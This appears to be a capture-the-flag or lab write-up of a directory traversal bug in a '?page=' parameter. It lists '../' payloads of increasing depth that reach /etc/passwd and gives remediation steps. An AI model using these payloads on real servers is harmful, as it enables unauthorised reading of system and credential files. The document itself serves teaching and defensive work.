# Breach: Directory Traversal via Page Parameter

## Discovery & Exploit

The website uses a query parameter to load pages:

``?page=XXX``

This pattern is commonly vulnerable to **directory traversal**, which allows access to arbitrary files on the server.

We tested for this by attempting to access the UNIX password file `/etc/passwd`, incrementally increasing the traversal depth:

- `?page=../etc/passwd` → Response: “Wtf ?”
- `?page=../../etc/passwd` → “Wrong..”
- `?page=../../../etc/passwd` → “Nope..”
- `?page=../../../../etc/passwd` → “Almost.”
- `?page=../../../../../etc/passwd` → “Still nope..”
- `?page=../../../../../../etc/passwd` → “Nope..”
- `?page=../../../../../../../etc/passwd` →  
→ **Success**, response with the [flag](../flag).

## Vulnerability Details

This is a **Path Traversal Attack**, where an attacker manipulates file paths to access restricted files outside the intended web root.

This is often possible when:

- User input is concatenated into file paths without sanitization
- The application does not restrict or validate path traversal characters (`../`)

References:

- https://owasp.org/www-community/attacks/Path_Traversal
- https://portswigger.net/web-security/file-path-traversal

## Remediation

1. Normalize and sanitize all user-supplied file paths.
2. Use a strict whitelist of allowed pages/files.
3. Avoid including user input directly in filesystem paths.
4. Run web applications with limited file system permissions.
5. Log and alert on unusual file access attempts.

---

<table width="100%">
  <tr>
    <td align="left"><a href="../../Breach10_SurveyValueBypass/Ressources/writeup.md">← Previous: Breach10</a></td>
    <td align="center"><a href="../../README.md">↑ Back to README</a></td>
    <td align="right"><a href="../../Breach12_StoredXSSFeedbackForm/Ressources/writeup.md">Next: Breach12 →</a></td>
  </tr>
</table>